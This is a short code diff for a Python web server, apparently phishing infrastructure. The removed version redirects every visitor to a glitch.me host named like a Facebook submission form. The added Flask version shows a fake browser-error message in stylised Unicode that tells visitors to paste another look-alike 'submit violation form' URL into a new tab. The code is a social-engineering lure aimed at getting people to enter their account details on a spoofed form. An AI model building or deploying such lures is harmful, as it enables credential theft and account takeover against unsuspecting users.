@@ -1,16 +1,10 @@
-from http.server import HTTPServer, BaseHTTPRequestHandler
+from flask import Flask
 
-class RedirectHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(302)
-        self.send_header('Location', 'https://fb--submit--here.glitch.me/')  # Replace with your desired URL
-        self.end_headers()
+app = Flask(__name__)
 
-def run(server_class=HTTPServer, handler_class=RedirectHandler, port=8000):
-    server_address = ('', port)
-    httpd = server_class(server_address, handler_class)
-    print(f"Server running on port {port}")
-    httpd.serve_forever()
+@app.route('/')
+def hello_world():
+    return '𝐄𝐫𝐫𝐨𝐫 𝐢𝐧 𝐲𝐨𝐮𝐫 𝐛𝐫𝐨𝐰𝐬𝐞𝐫 𝐜𝐨𝐩𝐲 𝐭𝐡𝐢𝐬 𝐮𝐫𝐥 𝐩𝐚𝐬𝐭𝐞 𝐢𝐧 𝐧𝐞𝐰 𝐭𝐚𝐛 (https://submit-violation-form-us-now.glitch.me/) '
 
 if __name__ == '__main__':
-    run()
+    app.run()
